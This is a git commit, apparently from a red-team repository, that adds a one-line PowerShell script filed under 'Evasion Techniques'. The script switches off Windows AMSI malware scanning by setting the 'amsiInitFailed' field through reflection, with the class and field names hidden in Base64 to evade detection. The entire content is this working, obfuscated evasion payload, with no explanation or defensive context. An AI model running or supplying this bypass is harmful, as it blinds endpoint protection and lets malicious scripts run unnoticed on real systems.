5a31c16822f9977eb8144c28c047d297267b3114
H3ll_Ka1ser <98783688+H3llKa1ser@users.noreply.github.com>
2025-05-17 15:34:41 +0300

    Create AMSIBase64.ps1

---
+++ Red Teaming/Evasion Techniques/Scripts/AMSIBase64.ps1
@@ -0,0 +1,1 @@
+[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
